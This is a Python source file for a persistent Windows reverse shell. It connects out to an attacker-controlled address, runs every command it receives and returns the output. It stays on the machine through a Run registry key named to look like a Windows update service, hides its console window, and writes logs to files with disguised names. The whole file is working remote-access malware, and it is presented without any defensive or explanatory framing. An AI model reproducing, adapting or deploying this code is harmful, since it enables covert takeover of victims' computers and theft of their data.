"""
PERSISTENT SHELL WITH RELIABLE LOGGING - Updated Version
"""
import socket
import subprocess
import os
import time
import sys
import winreg
from datetime import datetime

ATTACKER_IP = "192.168.56.1"  # CHANGE THIS TO YOUR IP!
ATTACKER_PORT = 4444

# LOG FILE LOCATION - Using multiple locations for reliability
LOG_FILE1 = os.path.expanduser("~\\AppData\\Local\\Temp\\~spoolsv.log")
LOG_FILE2 = os.path.expanduser("~\\Desktop\\attacker_activity.log")  # Visible on desktop for testing
LOG_FILE3 = "C:\\Windows\\Temp\\~update.log"  # Another hidden location

def log_activity(message):
    """Log all attacker activity to MULTIPLE files"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}\n"
    
    # Try multiple locations to ensure logging works
    for log_file in [LOG_FILE1, LOG_FILE2, LOG_FILE3]:
        try:
            # Create directory if it doesn't exist
            os.makedirs(os.path.dirname(log_file), exist_ok=True)
            
            # Append to log file
            with open(log_file, 'a', encoding='utf-8') as f:
                f.write(log_entry)
        except:
            pass  # Silently fail if can't write to a particular location
    
    # Also try to write to current directory as last resort
    try:
        with open("shell_log.txt", 'a', encoding='utf-8') as f:
            f.write(log_entry)
    except:
        pass

def add_to_startup():
    """Add to registry to survive reboots"""
    try:
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)
        
        # Add to registry
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, "WindowsUpdateSvc", 0, winreg.REG_SZ, f'"{exe_path}"')
        
        log_activity("[SYSTEM] Persistence added to registry")
    except Exception as e:
        log_activity(f"[SYSTEM] Persistence failed: {e}")

def reverse_shell():
    """Main shell with logging"""
    log_activity("=" * 60)
    log_activity("PERSISTENT SHELL STARTED")
    log_activity(f"PID: {os.getpid()}")
    log_activity(f"Time: {datetime.now()}")
    log_activity("=" * 60)
    
    add_to_startup()
    
    while True:
        try:
            # Create socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            
            hostname = os.environ.get('COMPUTERNAME', 'Unknown')
            username = os.environ.get('USERNAME', 'Unknown')
            
            log_activity(f"[CONNECTION] Connected to attacker from {hostname}\\{username}")
            
            # Send banner with logging info
            s.send(f"\n[🔴 PERSISTENT SHELL - LOGGING ENABLED]\n{hostname}\\{username}\n".encode())
            s.send(f"[📁] Logs: {LOG_FILE1}\n$ ".encode())
            
            while True:
                try:
                    cmd = s.recv(8192).decode().strip()
                    
                    if not cmd:
                        continue
                    
                    if cmd.lower() == 'exit':
                        log_activity(f"[COMMAND] exit - Shell terminated")
                        break
                    
                    # Log the command
                    log_activity(f"[ATTACKER] {cmd}")
                    
                    if cmd.lower().startswith('cd '):
                        try:
                            os.chdir(cmd[3:])
                            result = f"{os.getcwd()}\n"
                            log_activity(f"[RESULT] Directory changed to: {os.getcwd()}")
                        except Exception as e:
                            result = f"Error: {e}\n"
                            log_activity(f"[ERROR] cd failed: {e}")
                        s.send(result.encode())
                    
                    else:
                        try:
                            # Execute command and capture output
                            proc = subprocess.Popen(
                                cmd,
                                shell=True,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE,
                                stdin=subprocess.PIPE
                            )
                            
                            try:
                                stdout, stderr = proc.communicate(timeout=30)
                                
                                # Log the output (first 200 chars to keep log manageable)
                                if stdout:
                                    output_preview = stdout.decode(errors='ignore')[:200].replace('\n', ' ')
                                    log_activity(f"[RESULT] stdout: {output_preview}...")
                                if stderr:
                                    error_preview = stderr.decode(errors='ignore')[:200].replace('\n', ' ')
                                    log_activity(f"[RESULT] stderr: {error_preview}...")
                                if not stdout and not stderr:
                                    log_activity("[RESULT] Command executed (no output)")
                                
                                # Send output back to attacker
                                if stdout:
                                    s.send(stdout)
                                if stderr:
                                    s.send(stderr)
                                if not stdout and not stderr:
                                    s.send(b"[OK]\n")
                                    
                            except subprocess.TimeoutExpired:
                                proc.kill()
                                s.send(b"Command timed out\n")
                                log_activity("[ERROR] Command timed out")
                                
                        except Exception as e:
                            s.send(f"Error: {e}\n".encode())
                            log_activity(f"[ERROR] Command execution failed: {e}")
                    
                    s.send(b"$ ")
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    log_activity(f"[ERROR] Command loop error: {e}")
                    break
                    
            s.close()
            log_activity("[CONNECTION] Connection closed")
            
        except Exception as e:
            log_activity(f"[CONNECTION] Lost connection: {e}")
            time.sleep(10)
        
        time.sleep(5)

if __name__ == "__main__":
    # Hide console
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    
    # Write a test log entry immediately to verify logging works
    try:
        with open(os.path.expanduser("~\\Desktop\\shell_started.txt"), 'w') as f:
            f.write(f"Shell started at {datetime.now()}\n")
    except:
        pass
    
    reverse_shell()